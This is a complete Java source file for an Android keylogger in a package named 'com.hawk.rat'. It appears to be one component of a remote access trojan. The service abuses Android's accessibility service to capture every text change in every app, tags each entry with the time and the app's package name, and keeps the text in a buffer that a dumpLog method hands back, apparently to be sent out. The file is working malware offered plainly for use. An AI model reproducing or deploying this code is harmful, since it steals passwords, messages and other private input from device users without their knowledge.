package com.hawk.rat;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
public class KeyloggerService extends AccessibilityService {
    private static final StringBuilder log = new StringBuilder();
    private static final int MAX = 4000;
    private static final SimpleDateFormat fmt = new SimpleDateFormat("HH:mm:ss", Locale.US);
    @Override public void onAccessibilityEvent(AccessibilityEvent e) {
        try {
            if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                CharSequence t = e.getText() != null && e.getText().size() > 0 ? e.getText().get(0) : "";
                String p = e.getPackageName() != null ? e.getPackageName().toString() : "?";
                String l = "[" + fmt.format(new Date()) + "] " + p + " :: " + t + "\n";
                synchronized (log) { log.append(l); if (log.length() > MAX) log.delete(0, log.length() - MAX); }
            }
        } catch (Exception ignored) {}
    }
    @Override public void onInterrupt() {}
    @Override protected void onServiceConnected() {
        AccessibilityServiceInfo i = new AccessibilityServiceInfo();
        i.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        i.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        i.notificationTimeout = 100;
        setServiceInfo(i);
    }
    public static String dumpLog() {
        synchronized (log) { return log.length() == 0 ? "⌨ empty" : "⌨ Log:\n" + log.toString(); }
    }
}
